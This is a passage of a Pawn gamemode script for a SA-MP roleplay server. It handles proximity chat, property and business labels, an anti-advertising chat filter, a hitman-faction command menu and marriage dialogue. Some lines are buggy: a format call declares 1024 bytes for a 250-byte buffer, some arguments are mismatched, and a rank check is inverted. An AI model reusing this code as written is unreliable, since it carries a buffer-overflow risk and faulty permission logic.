format(alistring, 256, "Admin %s has removed you from your car/mopped reason: %s", sendername, (result));
SCM(playa,COLOR_LIGHTRED, alistring);
if(GetPlayerState(playa) == PLAYER_STATE_DRIVER) {
SetVehicleToRespawn(thiscar);
}
return 1;
}
}
return 1;
}
    SendClientMessage(playerid, COLOR_YELLOW2, "Error: Unknown command.");
    return 1;
}

public ProxDetector(Float:radi, playerid, string[],col1,col2,col3,col4,col5)
{
    if(IsPlayerConnected(playerid))
    {
        new Float:posx, Float:posy, Float:posz;
        new Float:oldposx, Float:oldposy, Float:oldposz;
        new Float:tempposx, Float:tempposy, Float:tempposz;
        GetPlayerPos(playerid, oldposx, oldposy, oldposz);
        //radi = 2.0; //Trigger Radius
        for(new i = 0; i < LastPID; i++)
        {
            if(IsPlayerConnected(i) && (GetPlayerVirtualWorld(playerid) == GetPlayerVirtualWorld(i)))
            {
                if(!BigEar[i])
                {
                    GetPlayerPos(i, posx, posy, posz);
                    tempposx = (oldposx -posx);
                    tempposy = (oldposy -posy);
                    tempposz = (oldposz -posz);
                    //printf("DEBUG: X:%f Y:%f Z:%f",posx,posy,posz);
                    if (((tempposx < radi/16) && (tempposx > -radi/16)) && ((tempposy < radi/16) && (tempposy > -radi/16)) && ((tempposz < radi/16) && (tempposz > -radi/16)))
                    {
                        SendClientMessage(i, col1, string);
                    }
                    else if (((tempposx < radi/8) && (tempposx > -radi/8)) && ((tempposy < radi/8) && (tempposy > -radi/8)) && ((tempposz < radi/8) && (tempposz > -radi/8)))
                    {
                        SendClientMessage(i, col2, string);
                    }
                    else if (((tempposx < radi/4) && (tempposx > -radi/4)) && ((tempposy < radi/4) && (tempposy > -radi/4)) && ((tempposz < radi/4) && (tempposz > -radi/4)))
                    {
                        SendClientMessage(i, col3, string);
                    }
                    else if (((tempposx < radi/2) && (tempposx > -radi/2)) && ((tempposy < radi/2) && (tempposy > -radi/2)) && ((tempposz < radi/2) && (tempposz > -radi/2)))
                    {
                        SendClientMessage(i, col4, string);
                    }
                    else if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
                    {
                        SendClientMessage(i, col5, string);
                    }
                }
                else
                {
                    SendClientMessage(i, col1, string);
                }
            }
        }
    }//not connected
    return 1;
}

public CrimInRange(Float:radi, playerid,copid)
{
    if(IsPlayerConnected(playerid)&&IsPlayerConnected(copid))
    {
        new Float:posx, Float:posy, Float:posz;
        new Float:oldposx, Float:oldposy, Float:oldposz;
        new Float:tempposx, Float:tempposy;
        GetPlayerPos(playerid, oldposx, oldposy, oldposz);
        GetPlayerPos(copid, posx, posy, posz);
        tempposx = (oldposx -posx);
        tempposy = (oldposy -posy);
        if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)))
        {
            return 1;
        }
    }
    return 0;
}

public ProxDetectorS(Float:radi, playerid, targetid)
{
    if(IsPlayerConnected(playerid)&&IsPlayerConnected(targetid))
    {
        new Float:posx, Float:posy, Float:posz;
        new Float:oldposx, Float:oldposy, Float:oldposz;
        new Float:tempposx, Float:tempposy, Float:tempposz;
        GetPlayerPos(playerid, oldposx, oldposy, oldposz);
        GetPlayerPos(targetid, posx, posy, posz);
        tempposx = (oldposx -posx);
        tempposy = (oldposy -posy);
        tempposz = (oldposz -posz);
        if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
        {
            return 1;
        }
    }
    return 0;
}

public PlayerToPoint(Float:radi, playerid, Float:x, Float:y, Float:z)
{
    if(IsPlayerConnected(playerid))
    {
        new Float:oldposx, Float:oldposy, Float:oldposz;
        new Float:tempposx, Float:tempposy, Float:tempposz;
        GetPlayerPos(playerid, oldposx, oldposy, oldposz);
        tempposx = (oldposx -x);
        tempposy = (oldposy -y);
        tempposz = (oldposz -z);
        if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
        {
            return 1;
        }
    }
    return 0;
}

public CustomPickups()
{
    new string[250];
    format(string, 1024, "Hotdog Forooshi\nType: /hotdog to eat \n Cost: $%i", SBizzInfo[21][sbEntranceCost]);
    for(new i;i<10;i++)
    {
        UpdateDynamic3DTextLabelText(hotdog[i], COLOR_GRAD4, string);
    }

    for(new h = 0; h < sizeof(SBizzInfo); h++)
    {
        if(SBizzInfo[h][sbOwned] == 0)
        {
            format(string, sizeof(string), "{57e547}SBiz ID %d \n{FFFFFF}%s \n{57e547}in Business, Foroshi Ast \nCost: {FFFFFF}$%s \n{57e547}Level: {FFFFFF}%d \n{57e547}to buy this Business type {FFFFFF}/buybiz",SBizzInfo[h],SBizzInfo[h][sbMessage],FormatNumber(SBizzInfo[h][sbBuyPrice]),SBizzInfo[h][sbLevelNeeded]);
            UpdateDynamic3DTextLabelText(sbizer[h], COLOR_BIZ, string);
        }
        else if(SBizzInfo[h][sbOwned] == 1)
        {
            format(string, sizeof(string), "{57e547}SBiz ID %d \n{FFFFFF}%s \n{57e547}Saheb: {FFFFFF}%s \n{57e547}Fee: {FFFFFF}$%s",SBizzInfo[h],SBizzInfo[h][sbMessage],SBizzInfo[h][sbOwner],FormatNumber(SBizzInfo[h][sbEntranceCost]));
            UpdateDynamic3DTextLabelText(sbizer[h], COLOR_BIZ, string);
        }
        else if(SBizzInfo[h][sbOwned] == 2)
        {
            format(string, sizeof(string), "{57e547}SBiz ID %d \n{FFFFFF}%s \n{57e547}This Business is for sale \nOwned by: {FFFFFF}%s \n{57e547}Fee: {FFFFFF}$%s \n{57e547}Cost: {FFFFFF}$%s \n{57e547}to buy this Business type {FFFFFF}/buybiz",SBizzInfo[h],SBizzInfo[h][sbMessage],SBizzInfo[h][sbOwner],FormatNumber(SBizzInfo[h][sbEntranceCost]),FormatNumber(SBizzInfo[h][sbForosh]));
            UpdateDynamic3DTextLabelText(sbizer[h], COLOR_BIZ, string);
        }
    }
    for(new h = 0; h < sizeof(HouseInfo); h++)
    {
        if(HouseInfo[h][hOwned] == 1) // kharidari shode{5D7E8D}
        {
            if(HouseInfo[h][hRentabil] == 0)
            {
                format(string, sizeof(string), "{BBF060}House ID %d\n{BBF060}This house is owned by: {FFFFFF}%s \n{BBF060}Level: {FFFFFF}%d",HouseInfo[h][hSQLID],HouseInfo[h][hOwner], HouseInfo[h][hLevel]);
                UpdateDynamic3DTextLabelText(houser[h], COLOR_HOUSE, string);
            }
            else if(HouseInfo[h][hRentabil] != 0)
            {
                format(string, sizeof(string), "{BBF060}House ID %d\n{BBF060}This house is owned by: {FFFFFF}%s \n{BBF060}Rent Price: {FFFFFF}$%s \n{BBF060}Level: {FFFFFF}%d \n{BBF060}To rent a room type {FFFFFF}/rentroom",HouseInfo[h][hSQLID],HouseInfo[h][hOwner],FormatNumber(HouseInfo[h][hRent]),HouseInfo[h][hLevel]);
                UpdateDynamic3DTextLabelText(houser[h], COLOR_HOUSE, string)
            }
        }
        else if(HouseInfo[h][hOwned] == 0) // kharidari nashode
        {
            format(string, sizeof(string), "{BBF060}House ID %d\n{BBF060}This house is for sale \n{BBF060}Cost: {FFFFFF}$%s \n{BBF060}Level: {FFFFFF}%d \n{BBF060}To buy this house type {FFFFFF}/buyhouse",HouseInfo[h][hSQLID],FormatNumber(HouseInfo[h][hValue]),HouseInfo[h][hLevel]);
            UpdateDynamic3DTextLabelText(houser[h], COLOR_HOUSE, string)
        }
        else if(HouseInfo[h][hOwned] == 2) // kharidari shode vali baraye foroshe
        {
            if(HouseInfo[h][hRentabil] == 0)
            {
                format(string, sizeof(string), "{{BBF060}House ID %d\n{BBF060}This House is for sale\nOwned by: {FFFFFF}%s \n{BBF060}Level: {FFFFFF}%d\n{BBF060}Cost: {FFFFFF}$%s\n{BBF060}To buy this house type {FFFFFF}/buyhouse",HouseInfo[h][hSQLID],HouseInfo[h][hOwner], HouseInfo[h][hLevel], FormatNumber(HouseInfo[h][hForosh]));
                UpdateDynamic3DTextLabelText(houser[h], COLOR_HOUSE, string);
            }
            else if(HouseInfo[h][hRentabil] == 1)
            {
                format(string, sizeof(string), "{BBF060}House ID %d\n{BBF060}This House is for sale\nOwned by: {FFFFFF}%s \n{BBF060}Rent Price: {FFFFFF}$%s\n{BBF060}Level: {FFFFFF}%d \n{BBF060}Cost: {FFFFFF}$%s\n{BBF060}To rent a room type {FFFFFF}/rentroom\n{BBF060}To buy this house type {FFFFFF}/buyhouse",HouseInfo[h][hSQLID],HouseInfo[h][hOwner],FormatNumber(HouseInfo[h][hRent]),HouseInfo[h][hLevel], FormatNumber(HouseInfo[h][hForosh]));
                UpdateDynamic3DTextLabelText(houser[h], COLOR_HOUSE, string);
            }
        }
    }
    for(new h = 0; h < sizeof(BizzInfo); h++)
    {
        if(BizzInfo[h][bOwned] == 0)
        {
            format(string, sizeof(string), "{57e547}Biz ID %d \n{FFFFFF}%s \n{57e547}This Business is for sale \n Cost: {FFFFFF}$%s \n{57e547}Level: {FFFFFF}%d \n{57e547}to buy this Business type {FFFFFF}/buybiz",BizzInfo[h],BizzInfo[h][bMessage],FormatNumber(BizzInfo[h][bBuyPrice]),BizzInfo[h][bLevelNeeded]);
            UpdateDynamic3DTextLabelText(bizer[h], COLOR_BIZ, string);
        }
        else if(BizzInfo[h][bOwned] == 1)
        {
            format(string, sizeof(string), "{57e547}Biz ID %d \n{FFFFFF}%s \n{57e547}This Business is owned by: {FFFFFF}%s \n{57e547}Entrance Fee: {FFFFFF}$%s \n{57e547}Type: {FFFFFF}/enter to enter",BizzInfo[h],BizzInfo[h][bMessage],BizzInfo[h][bOwner],FormatNumber(BizzInfo[h][bEntranceCost]));
            UpdateDynamic3DTextLabelText(bizer[h], COLOR_BIZ, string);
        }
        else if(BizzInfo[h][bOwned] == 2)
        {
            format(string, sizeof(string), "{57e547}Biz ID %d \n{FFFFFF}%s \n{57e547}This Business is for sale \n{0000E1}Owned by: {FFFFFF}%s \n{57e547}Entrance Fee: {FFFFFF}$%s \n{57e547}Cost: {FFFFFF}$%s \n{57e547}Type: {FFFFFF}/enter to enter \n{57e547}to buy this Business type {FFFFFF}/buybiz",BizzInfo[h],BizzInfo[h][bMessage],BizzInfo[h][bOwner],FormatNumber(BizzInfo[h][bEntranceCost]),FormatNumber(BizzInfo[h][bForosh]));
            UpdateDynamic3DTextLabelText(bizer[h], COLOR_BIZ, string);
        }
    }


    for(new i;i<LastPID;i++)
    {
        if(IsPlayerConnected(i))
        {
            if (GetPlayerState(i) == 1 && PlayerToPoint(2.0, i,757.5751,5.6157,1000.7015))
            {
                GameTextForPlayer(i, "~g~Welcome to gym~n~~w~Type ~r~/fightstyle ~w~to learn new fight moves.", 5000, 3);
            }
            else if (GetPlayerState(i) == 1 && PlayerToPoint(1.0, i,1615.0603,1815.7771,10.8203))
            {
                if(PlayerInfo[i][pMember] == 4 || PlayerInfo[i][pLeader] == 4)
                {
                    GameTextForPlayer(i, "~w~Type: ~r~/up~n~~w~for go to the Helicopter", 5000, 3);
                }
                else
                {
                    GameTextForPlayer(i, "~r~Medic Elevar!", 5000, 3);
                }
            }
            if(GetPlayerState(i) == 1 && PlayerToPoint(1.0, i,2770.6973,-1628.4293,12.1775))
            {
                if(PlayerInfo[i][pMatsLic] >= 1)
                {
                    if(PlayerInfo[i][pJob] == 9)
                    {
                        GameTextForPlayer(i, "~w~Type /materials get for buy materials.", 2000, 3);
                    }
                    else
                    {
                        GameTextForPlayer(i, "~w~You are not a arms dealer.", 2000, 3);
                    }
                }
                else
                {
                    GameTextForPlayer(i, "~w~You haven't a materials license.", 2000, 3);
                }
            }
            if(GetPlayerState(i) == 1 && PlayerToPoint(1.0, i,1712.9865,913.2946,10.8203))
            {
                if(PlayerInfo[i][pMatsLic] >= 1)
                {
                    if(PlayerInfo[i][pJob] == 9)
                    {
                        GameTextForPlayer(i, "~w~Type /materials deliver~n~for materials deliver.", 2000, 3);
                    }
                    else
                    {
                        GameTextForPlayer(i, "~w~You are not a arms dealer.", 2000, 3);
                    }
                }
                else
                {
                    GameTextForPlayer(i, "~w~You haven't a materials license.", 2000, 3);
                }
            }
            else if (GetPlayerState(i) == 1 && PlayerToPoint(1.0, i,1607.4210,1787.6932,30.4688))
            {
                if(PlayerInfo[i][pMember] == 4 || PlayerInfo[i][pLeader] == 4)
                {
                    GameTextForPlayer(i, "~w~Type: ~r~/down~n~~w~for go down", 5000, 3);
                }
                else
                {
                    GameTextForPlayer(i, "~r~Medic Elevar!", 5000, 3);
                }
            }
            else if (PlayerToPoint(1.0, i,960.3047,1784.0295,8.8516))
            {
                if(PlayerInfo[i][pMember] == 10 || PlayerInfo[i][pLeader] == 10)
                {
                    GameTextForPlayer(i, "~w~Type: ~r~/up~n~~w~for go to the Helicopter", 5000, 3);
                }
                else
                {
                    GameTextForPlayer(i, "~r~Taxi Elevator!", 5000, 3);
                }
            }
            else if (PlayerToPoint(1.0, i,946.0334,1790.6084,15.7941))
            {
                if(PlayerInfo[i][pMember] == 10 || PlayerInfo[i][pLeader] == 10)
                {
                    GameTextForPlayer(i, "~w~Type: ~r~/down~n~~w~for go down", 5000, 3);
                }
                else
                {
                    GameTextForPlayer(i, "~r~Taxi Elevator!", 5000, 3);
                }
            }
            else if (GetPlayerState(i) == 1 && PlayerToPoint(1.0, i,1524.7275,-1677.5446,5.8906))
            {
                if(IsACop(i))
                {
                    GameTextForPlayer(i, "~g~Police Department elevator~n~~w~Type: ~r~/pdup ~n~~w~to go up", 5000, 3);
                }
                else
                {
                    GameTextForPlayer(i, "~r~Cop only!", 5000, 3);
                }
            }
            //else if(PlayerToPoint(1.0, i,1641.388671,-2177.379638,13.554687))
            //{
              //  GameTextForPlayer(i,"~g~Welcome To Driving School~n~~r~/EXAM ~w~Jahate Amoozesh Va Daryaft ~y~Driving LICENSE~n~~w~Hazine:~g~$50",1200,3);
           // }
            else if (GetPlayerState(i) == 1 && PlayerToPoint(1.0, i,242.3151,66.3457,1003.6406))
            {
                if(IsACop(i))
                {
                    GameTextForPlayer(i, "~g~Police Department elevator~n~~w~Type: ~r~/pddown ~n~~w~to go down", 5000, 3);
                }
                else
                {
                    GameTextForPlayer(i, "~r~Cop only!", 5000, 3);
                }
            }
        }
    }
    return 1;
}
public OnPlayerText(playerid, text[])
{
 	  new vehicleid = GetPlayerVehicleID(playerid);
 	  if(AgeBarDasht[playerid] == 0){
        if(Isjscar(vehicleid))
        {
        	new in;
        	in = strval(text[0]);
           	if(in == 1)	{AgeBarDasht[playerid] = 1;}
          	else if(in == 2)	{AgeBarDasht[playerid] = 2;}
   			else if(in == 3)	{AgeBarDasht[playerid] = 3;}
        	else if(in == 4)	{AgeBarDasht[playerid] = 4;}
        	else { SCM(playerid,-1,"{FF0000}1 {ffffff} - {FF0000} 4"); return 0; }
    		if(AgeBarDasht[playerid] != 0){
    	    CP[playerid] = 256512;
    	    OnCheckpoint[playerid] = 1;
    	    new rand = random(sizeof(Sherkatcp));
  	 		SetPlayerCheckpoint(playerid,Sherkatcp[rand][0],Sherkatcp[rand][1],Sherkatcp[rand][2],3.0);
    	    }
    	    SCM(playerid,-1,"Boro Be {FF0000}Checkpoint{ffffff} Va Bar Ro Be Maghsad Bereson");
            PlayerTextDrawHide(playerid,jtxd[playerid][0]);
            PlayerTextDrawHide(playerid,jtxd[playerid][1]);
            PlayerTextDrawHide(playerid,jtxd[playerid][2]);
            PlayerTextDrawHide(playerid,jtxd[playerid][3]);
            PlayerTextDrawHide(playerid,jtxd[playerid][4]);
            PlayerTextDrawHide(playerid,jtxd[playerid][5]);
            PlayerTextDrawHide(playerid,jtxd[playerid][6]);
            return 0;
            }
            }
    if(strfind(text, "87", true) != -1 || strfind(text, "236", true) != -1 || strfind(text, "7777", true) != -1 || strfind(text, "ip", true) != -1 || strfind(text, "spl", true) != -1 || strfind(text, "185", true) != -1 || strfind(text, "79", true) != -1 || strfind(text, "@", true) != -1 || strfind(text, "sv", true) != -1 || strfind(text, "s v", true) != -1 || strfind(text, "server", true) != -1)
    {
        new strchat[256];
        ApplyAnimation(playerid,"PED","IDLE_CHAT",4.1,0,1,1,1,1);
        format(strchat, sizeof(strchat), "%s Goft: %s",PlayerName(playerid), text);
		ProxDetector(20.0, playerid, strchat,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
		AdminWarn(strchat);
        return 0;
	}
	if(IsLogedIn[playerid] == false)
	{
		SCM(playerid, COLOR_ALI,"Account Shoma Dar Hale Load Shodan Ast.");
		return 0;
	}
	if(AccountLock[playerid] == 1)
	{
		SCM(playerid, COLOR_ALI,"In Account Ghofl Ast.");
		return 0;
	}
//	if(IsTabligh(text))
//	{
//		new strdetect[128];
//		format(strdetect,sizeof(strdetect), "[L-TABLIGH]: %s(%d): %s", PINFO[playerid][pName],playerid,text);
//		AdminWarn(strdetect);
//		return 0;
//	}







    AFKTime[playerid] = 0;
    if(gPlayerLogged[playerid] == 0)
    {
        SCM(playerid,COLOR_ALI,"First login into the server.");
        return 0;
    }
	if(mpop[playerid] == 5566) return SendClientMessage(playerid, TEAM_CYAN_COLOR, "You Dont Login Into Server");
    if(PINFO[playerid][pAdmin] < 7)
    {
        new noghtepos = strfind(text, ".", true);
        if(noghtepos != -1)
        {
            new noghte, adad;
            for(new i;i<strlen(text);i++)
            {
                switch(text[i])
                {
                    case '.':noghte++;
                    case 0x30..0x39:adad++;
                }
            }
            if(adad >= 5)
            {
                if(noghte >= 3)
                {
                    if(text[noghtepos+1] >= 0x30 && text[noghtepos+1] <= 0x39)
                    {
                        new strdetect[150];
                        format(strdetect, 150, "%s needs to advertising on the server: %s", PINFO[playerid][pName], text);
                        AdminWarn(strdetect);
                        return 0;
                    }
                    if(text[noghtepos+1] == ' ' || text[noghtepos+1] == ' ')
                    {
                        if(text[noghtepos+1] >= 0x30 && text[noghtepos+1] <= 0x39)
                        {
                            new strdetect[150];
                            format(strdetect, 150, "%s needs to advertising on the server: %s", PINFO[playerid][pName], text);
                            AdminWarn(strdetect);
                            return 0;
                        }
                    }
                }
            }
        }

    }
    new sendername[MAX_PLAYER_NAME];
    new giveplayer[MAX_PLAYER_NAME];
    new string[256];
    new tmp[256];
    if(PlayerInfo[playerid][pMuteTime] >= 1)
    {
        SendClientMessage(playerid, TEAM_CYAN_COLOR, "You cannot speak, you have been silenced");
        return 0;
    }
    if(HLapTop[playerid] == true && (PINFO[playerid][pMember] == 8 || PINFO[playerid][pLeader] == 8))
    {
        new cmd[256];
        new idx;
        cmd = strtok(text,idx);
        if(!strcmp(cmd,"News",true))
        {
            tmp = strtok(text,idx);
            if(!strlen(tmp))
            {
                SCM(playerid,COL_SYN,"Syntax: News <Delete/Write/DeleteAll> <ID>");
                SCM(playerid,COLOR_ALI,"|________ Agency News ________|");
                for(new i;i<8;i++)
                {
                    format(string,sizeof string,"ID: %i Sender: %s Text: %s",i,News[i][Sender],News[i][Text]);
                    SCM(playerid,COLOR_HITMAN,string);
                }
                return 0;
            }
            if(!strcmp(tmp,"Delete",true))
            {
                tmp = strtok(text,idx);
                if(!strlen(tmp)) {SCM(playerid,COL_SYN,"Syntax: News Delete <ID>"); return 0; }
                new nid = strval(tmp);
                if(nid < 0 || nid > 7) {SCM(playerid,COL_SYN,"Wrong ID, Use a ID between 0 and 7"); return 0; }
                if(strcmp(News[nid][Sender],PINFO[playerid][pName],true) && PINFO[playerid][pLeader] != 8 && PINFO[playerid][pRank] <= 5) {SCM(playerid,COLOR_ALI,"This news isn't for you"); return 0; }
                strmid(News[nid][Sender],"No-one",0,strlen("No-one"),MAX_PLAYER_NAME);
                strmid(News[nid][Text],"Nothing",0,strlen("Nothing"),256);
                SCM(playerid,COL_SYN,"News has been deleted successfully.");
                return 0;
            }
            else if(!strcmp(tmp,"Write",true))
            {
                tmp = strtok(text,idx);
                if(!strlen(tmp)) {SCM(playerid,COL_SYN,"Syntax: News Write <ID> <Text>"); return 0; }
                new nid = strval(tmp);
                if(nid < 0 || nid > 7) {SCM(playerid,COL_SYN,"Wrong ID, Use a ID between 0 and 7"); return 0; }
                if(strcmp(News[nid][Sender],"No-one",true)) {SCM(playerid,COL_SYN,"That News is already using by anyone, first delete it."); return 0; }
                tmp = strtokEx(text,idx);
                if(!strlen(tmp)) {SCM(playerid,COL_SYN,"Syntax: News Write <ID> <Text>"); return 0; }
                if(strlen(tmp) < 10) {SCM(playerid,COL_SYN,"The length of the Text must be higher than 10"); return 0; }
                strmid(News[nid][Sender],PINFO[playerid][pName],0,strlen(PINFO[playerid][pName]),MAX_PLAYER_NAME);
                strmid(News[nid][Text],tmp,0,strlen(tmp),256);
                SCM(playerid,COL_SYN,"News has been writed successfully.");
                return 0;
            }
            else if(!strcmp(tmp,"DeleteAll",true))
            {
                if(PINFO[playerid][pLeader] == 8 && PINFO[playerid][pRank] <= 5) {SCM(playerid,COLOR_HITMAN,"You must be a leader of hitman to delete all news."); return 0; }
                for(new i;i<8;i++)
                {
                    strmid(News[i][Sender],"No-one",0,strlen("No-one"),MAX_PLAYER_NAME);
                    strmid(News[i][Text],"Nothing",0,strlen("Nothing"),256);
                }
                SCM(playerid,COL_SYN,"News has been deleted successfully.");
                return 0;
            }
            else {SCM(playerid,COL_SYN,"Syntax: News <Delete/Write/DeleteAll> <ID>"); return 0;}
        }
        else if(!strcmp(cmd,"MyContract",true))
        {
            if(AgentHitID[playerid] == INVALID_PLAYER_ID) {SCM(playerid,COLOR_ALI,"You haven't any contract."); return 0;}
            new strbitch[256];
            format(strbitch,256,"Your contract is %s(%i)",PINFO[AgentHitID[playerid]][pName],AgentHitID[playerid]);
            SCM(playerid,COLOR_HITMAN,strbitch);
            return 0;
        }
		else if(!strcmp(cmd,"Gethit",true))
		{
		    if(AgentHitID[playerid] != INVALID_PLAYER_ID) {SCM(playerid,COLOR_ALI,"You already on gethiting, please wait ..."); return 0; }
		    if(PINFO[playerid][pGetHitTime] > 0) {format(string,sizeof string,"You must wait for %i minutes.",PINFO[playerid][pGetHitTime]); SCM(playerid,COLOR_HITMAN,string); return 0;}
		    if(AgentContractID[playerid] != INVALID_PLAYER_ID) {SCM(playerid,COL_SYN,"You already on duty."); return 0;}
		    AgentHitID[playerid] = INVALID_PLAYER_ID;
		    AgentContractID[playerid] = ReturnAgentID();
		    AgentContractIDUsed[ReturnAgentID()] = true;
		    SCM(playerid,COLOR_HITMAN,"You go on duty with your Hitman job.");
		    return 0;
		}
		else if(!strcmp(cmd,"Leavehit",true))
		{
		    if(AgentContractID[playerid] == INVALID_PLAYER_ID) {SCM(playerid,COLOR_ALI,"You are not on duty(gethit)."); return 0;}
		    if(AgentHitID[playerid] == INVALID_PLAYER_ID)
		    {
		        AgentContractIDUsed[AgentContractID[playerid]] = false;
		        AgentContractID[playerid] = INVALID_PLAYER_ID;
		        AgentHitID[playerid] = INVALID_PLAYER_ID;
		    }
		    else
		    {
		        AgentContractIDUsed[AgentContractID[playerid]] = false;
		        AgentContractID[playerid] = INVALID_PLAYER_ID;
		        ContractsCount ++;
				ContractID[AgentHitID[playerid]] = ReturnContractID();
				ContractIDUsed[ReturnContractID()] = true;
				AgentHiterID[AgentHitID[playerid]] = INVALID_PLAYER_ID;
		        AgentHitID[playerid] = INVALID_PLAYER_ID;
		    }
		    SCM(playerid,COLOR_ALI,"You have leaved from hit duty successfully.");
			return 0;
		}
        else if(!strcmp(cmd,"Order",true))
        {
            if(OnCheckpoint[playerid] == 1) {SCM(playerid,COLOR_Good,"You already have an enable checkpoint."); return 0;}
            if(PINFO[playerid][pGunLic] <= 0) return SCM(playerid, COLOR_LIGHTBLUE, "You haven't a weapon license.");
            tmp = strtok(text,idx);
            if(!strlen(tmp))
            {
                SCM(playerid,COL_SYN,"Syntax: Order <ID>");
                SCM(playerid,COL_SYN,"Rank 1 - OrderID 1(Knife, Silenced 9mm MP5 SNIPER)");
                SCM(playerid,COL_SYN,"Rank 2 - OrderID 2(Knife, Silenced 9mm, M4, MP5 SNIPER)");
                SCM(playerid,COL_SYN,"Rank 2 - OrderID 3(Knife, Silenced 9mm, Ak47, MP5 SNIPER)");
                SCM(playerid,COL_SYN,"Rank 3 - OrderID 4(Knife, Silenced 9mm, M4, MP5 SNIPER)");
                SCM(playerid,COL_SYN,"Rank 3 - OrderID 5(Knife, Silenced 9mm, Ak47, MP5 SNIPER)");
                SCM(playerid,COL_SYN,"Rank 4 - OrderID 6(Knife, Silenced 9mm, M4, MP5 SNIPER)");
                SCM(playerid,COL_SYN,"Rank 4 - OrderID 7 (Knife, Silenced 9mm, Ak47, MP5 SNIPER)");
                return 0;
            }
            new iid = strval(tmp);
            if(iid >= 8 || iid <= 0) {SCM(playerid,COLOR_ALI,"Wrong ID, Type a ID between 1 and 7."); return 0;}
            switch(iid)
            {
                case 1:{HitmanTofangPackage[playerid] = 1;}
                case 2:{if(PINFO[playerid][pRank] < 2) { SCM(playerid,COLOR_ALI,"You haven't enough rank."); return 0; } HitmanTofangPackage[playerid] = 2;}
                case 3:{if(PINFO[playerid][pRank] < 2) { SCM(playerid,COLOR_ALI,"You haven't enough rank."); return 0; } HitmanTofangPackage[playerid] = 3;}
                case 4:{if(PINFO[playerid][pRank] < 3) { SCM(playerid,COLOR_ALI,"You haven't enough rank."); return 0; } HitmanTofangPackage[playerid] = 4;}
                case 5:{if(PINFO[playerid][pRank] < 3) { SCM(playerid,COLOR_ALI,"You haven't enough rank."); return 0; } HitmanTofangPackage[playerid] = 5;}
                case 6:{if(PINFO[playerid][pRank] < 4) { SCM(playerid,COLOR_ALI,"You haven't enough rank."); return 0; } HitmanTofangPackage[playerid] = 6;}
                case 7:{if(PINFO[playerid][pRank] < 4) { SCM(playerid,COLOR_ALI,"You haven't enough rank."); return 0; } HitmanTofangPackage[playerid] = 7;}
            }
            OnCheckpoint[playerid] = 1;
            CP[playerid] = 58723;
            SetPlayerCheckpoint(playerid,1073.211669,-344.768585,73.992187,3);
            SCM(playerid,COLOR_HITMAN,"Go to the checkpoint to get your weapons.");
            PlayerPlaySound(playerid,1149,0.0,0.0,0.0);
            return 0;
        }
        else if(!strcmp(cmd,"Ranks",true))
        {
            new teadad,StriLoL[2000],teadaddoroqi,strAli[500];
            for(new i;i<LastPID;i++)
            {
                if(IsPlayerConnected(i))
                {
                    if(PINFO[i][pMember] == 8 || PINFO[i][pLeader] == 8)
                    {
                        teadad ++;
                        teadaddoroqi ++;
                        if(teadaddoroqi > 10) {strcat(StriLoL,"\n\n",2000);teadaddoroqi = 0;}
                        format(strAli,sizeof strAli,"Name: %s , Rank: %d  ",PINFO[i][pName],PINFO[i][pRank]);
                        strcat(StriLoL,strAli,2000);
                    }
                }
            }
            ShowPlayerDialog(playerid,8432,DIALOG_STYLE_MSGBOX,"Hitman Agency Members",StriLoL,"OK","");
            return 0;
        }
        else if(!strcmp(cmd,"Logout",true))
        {
            HLapTop[playerid] = false;
            SCM(playerid,COLOR_HITMAN,"You have been disconnected from hitman agency server successfully.");
            return 0;
        }
        else
        {
            SCM(playerid,COLOR_HITMAN,"| - {FFFFFF}News {8E2323}- {FFFFFF}Displays News channel service");
            SCM(playerid,COLOR_HITMAN,"| - {FFFFFF}MyContract {8E2323}- {FFFFFF}Show your contract");
            SCM(playerid,COLOR_HITMAN,"| - {FFFFFF}Gethit {8E2323}- {FFFFFF}You can assign a contract with this");
            SCM(playerid,COLOR_HITMAN,"| - {FFFFFF}Leavehit {8E2323}- {FFFFFF}You can cancel your contract");
            SCM(playerid,COLOR_HITMAN,"| - {FFFFFF}Order {8E2323}- {FFFFFF}Order the weapons package according to your rank.");
            SCM(playerid,COLOR_HITMAN,"| - {FFFFFF}Ranks {8E2323}- {FFFFFF}Displays online members and their rank.");
            SCM(playerid,COLOR_HITMAN,"| - {FFFFFF}LOGOUT {8E2323}- {FFFFFF}Disconnect from Agency Server");
            return 0;
        }
    }


    if(MarriageCeremoney[playerid] > 0)
    {
        new idx;
        tmp = strtok(text, idx);
        if ((strcmp("yes", tmp, true, strlen(tmp)) == 0) && (strlen(tmp) == strlen("yes")))
        {
            if(GotProposedBy[playerid] < INVALID_PLAYER_ID)
            {
                if(IsPlayerConnected(GotProposedBy[playerid]))
                {
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    GetPlayerName(GotProposedBy[playerid], giveplayer, sizeof(giveplayer));
                    format(string, sizeof(string), "Priest: %s do you take %s as your lovely Wife? (type 'yes', anything else will reject the Marriage).", giveplayer,sendername);
                    SendClientMessage(GotProposedBy[playerid], COLOR_WHITE, string);
                    MarriageCeremoney[GotProposedBy[playerid]] = 1;
                    MarriageCeremoney[playerid] = 0;
                    GotProposedBy[playerid] = INVALID_PLAYER_ID;
                }
                else
                {
                    MarriageCeremoney[playerid] = 0;
                    GotProposedBy[playerid] = INVALID_PLAYER_ID;
                    return 0;
                }
            }
            else if(ProposedTo[playerid] < INVALID_PLAYER_ID)
            {
                if(IsPlayerConnected(ProposedTo[playerid]))
                {
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    GetPlayerName(ProposedTo[playerid], giveplayer, sizeof(giveplayer));
                    if(PlayerInfo[playerid][pSex] == 1 && PlayerInfo[ProposedTo[playerid]][pSex] == 2)
                    {
                        format(string, sizeof(string), "Priest: %s and %s i pronounce you now...Husband & Wife, you may kiss the Bride.", sendername, giveplayer);
                        SendClientMessage(playerid, COLOR_WHITE, string);
                        format(string, sizeof(string), "Priest: %s and %s i pronounce you now...Husband & Wife, you may kiss the Groom.", giveplayer, sendername);
                        SendClientMessage(ProposedTo[playerid], COLOR_WHITE, string);
                        format(string, sizeof(string), "Marriage News: We have a new lovely couple, %s & %s have been married.", sendername, giveplayer);
